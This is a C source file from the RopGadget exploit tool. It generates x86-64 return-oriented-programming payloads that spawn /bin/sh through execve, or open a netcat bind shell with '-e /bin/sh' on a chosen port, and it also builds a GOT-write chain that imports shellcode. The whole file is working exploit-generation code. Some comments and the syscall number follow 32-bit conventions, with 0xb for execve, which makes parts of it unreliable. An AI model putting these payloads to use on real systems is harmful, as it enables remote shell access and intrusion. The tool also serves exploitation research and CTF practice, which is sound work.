/*
** RopGadget - Release v3.4.2
** Jonathan Salwan - http://twitter.com/JonathanSalwan
** Allan Wirth - http://allanwirth.com/
** http://shell-storm.org
** 2012-11-11
**
** This program is free software; you can redistribute it and/or modify
** it under the terms of the GNU General Public License as published by
** the Free Software Foundation; either version 2 of the License, or
** (at your option) any later version.
**
** This program is distributed in the hope that it will be useful,
** but WITHOUT ANY WARRANTY; without even the implied warranty of
** MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
** GNU General Public License for more details.
**
** You should have received a copy of the GNU General Public License
** along with this program; if not, write to the Free Software
** Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/

#include "ropgadget.h"

#define WORD 8

static void makepartie2(t_list_inst *, int, int);

/* local: partie 1 | write /bin/sh in .data for execve("/bin/sh", NULL, NULL)*/
/* remote: partie 1 bis | write //usr/bin/netcat -ltp6666 -e///bin//sh in .data */
static void makepartie1(t_list_inst *list_ins, int local)
{
  int argv_start;
  int envp_start;
  t_rop_writer wr;
  char *second_reg;
  char reg_stack[32] = "pop %"; /* Whatever register we use to point to .data */
  char **argv;

  wr.mov = ret_addr_makecodefunc(list_ins, "mov %rax,(%r?x)");

  second_reg = get_reg(wr.mov->instruction, 0);
  strncat(reg_stack, second_reg, 3);
  free(second_reg);

  wr.reg_target = &reg_stack[0];
  wr.pop_target = ret_addr_makecodefunc(list_ins, wr.reg_target);

  wr.reg_data = "pop %rax";
  wr.pop_data = ret_addr_makecodefunc(list_ins, wr.reg_data);
  wr.zero_data = ret_addr_makecodefunc(list_ins, "xor %rax,%rax");

  fprintf(stdout, "\t%sPayload%s\n", YELLOW, ENDC);
  if (local)
    {
      argv = xmalloc(2 * sizeof(char *));
      argv[0] = "/bin/sh";
      argv[1] = NULL;

      fprintf(stdout, "\t\t%s# execve /bin/sh generated by RopGadget v3.4.2%s\n", BLUE, ENDC);
    }
  else
    {
      argv = xmalloc(4 * sizeof(char *));
      argv[0] = "/usr/bin/netcat";
      argv[1] = xmalloc(9 * sizeof(char));
      argv[2] = "-e/bin/sh";
      argv[3] = NULL;
      sprintf(argv[1], "-ltp%d", bind_mode.port);

      fprintf(stdout, "\t\t%s# execve /bin/sh bindport %d generated by RopGadget v3.4.2%s\n", BLUE, bind_mode.port, ENDC);

    }

  sc_print_argv((const char * const *)argv, &wr, 0, TRUE, WORD, &argv_start, &envp_start);

  if (!local)
    free(argv[1]);
  free(argv);

  makepartie2(list_ins, argv_start, envp_start);
}

/* local: partie 2 init reg => %ebx = "/bin/sh\0" | %ecx = "\0" | %edx = "\0"  for execve("/bin/sh", NULL, NULL)*/
/* remote: partie 2 bis init reg => %ebx = "/usb/bin/netcat\0" | %ecx = arg | %edx = "\0" */
static void makepartie2(t_list_inst *list_ins, int argv_start, int envp_start)
{
  t_asm *pop_ebx;
  t_asm *pop_ecx;
  t_asm *pop_edx;

  int i;
  t_asm *xor_eax;
  t_asm *syscall;
  t_asm *inc_eax;

  const char *pop_ebx_inst = "pop %rbx";
  const char *pop_ecx_inst = "pop %rcx";
  const char *pop_edx_inst = "pop %rdx";
  const char *xor_eax_inst = "xor %rax,%rax";
  const char *inc_eaxs[] = {"inc %rax", "inc %eax", "inc %ax", "inc %al", NULL};
  const char *syscall_inst = "syscall";

  pop_ebx = ret_addr_makecodefunc(list_ins, pop_ebx_inst);
  pop_ecx = ret_addr_makecodefunc(list_ins, pop_ecx_inst);
  pop_edx = ret_addr_makecodefunc(list_ins, pop_edx_inst);

  xor_eax = ret_addr_makecodefunc(list_ins, xor_eax_inst);

  for (i = 0, inc_eax = NULL; inc_eaxs[i] != NULL && inc_eax == NULL; i++)
    inc_eax = ret_addr_makecodefunc(list_ins, inc_eaxs[i]);

  syscall = ret_addr_makecodefunc(list_ins, syscall_inst);

  /* set %ebx (program name) */
  sc_print_sect_addr_pop(pop_ebx, pop_ebx_inst, 0, TRUE, WORD);

  /* set %ecx (arguments) */
  sc_print_sect_addr_pop(pop_ecx, pop_ecx_inst, argv_start, TRUE, WORD);

  /* set %edx (environment) */
  sc_print_sect_addr_pop(pop_edx, pop_edx_inst, envp_start, TRUE, WORD);

  /* set %eax => 0 */
  sc_print_solo_inst(xor_eax, WORD);

  /* set %eax => 0xb for sys_execve() */
  for (i = 0; i != 0xb; i++)
    sc_print_solo_inst(inc_eax, WORD);

  sc_print_solo_inst(syscall, WORD);
}

void x8664_makecode(t_list_inst *list_ins)
{
  fprintf(stdout, "\t%sPayload%s\n", YELLOW, ENDC);
  makepartie1(list_ins, !bind_mode.flag);
  fprintf(stdout, "\t%sEOF Payload%s\n", YELLOW, ENDC);
}

/* partie 1 | import shellcode in ROP instruction */
static void makepartie1_importsc(t_list_inst *list_ins, char *pop_reg)
{
  t_importsc_writer wr;
  wr.pop_reg = pop_reg;

  wr.pop_gad = ret_addr_makecodefunc(list_ins, pop_reg);

  wr.mov_gad2 = ret_addr_makecodefunc(list_ins, "mov (%r?x),%r?x");
  wr.mov_gad3 = ret_addr_makecodefunc(list_ins, "mov %r?x,%r?x");
  wr.mov_gad4 = ret_addr_makecodefunc(list_ins, "mov %r?x,(%r?x)");

  sc_print_gotwrite(&wr, WORD);
}

void x8664_makecode_importsc(t_list_inst *list_ins, char *pop_reg)
{
  fprintf(stdout, "\t%sPayload%s\n", YELLOW, ENDC);
  makepartie1_importsc(list_ins, pop_reg);
  fprintf(stdout, "\t%sEOF Payload%s\n", YELLOW, ENDC);
}
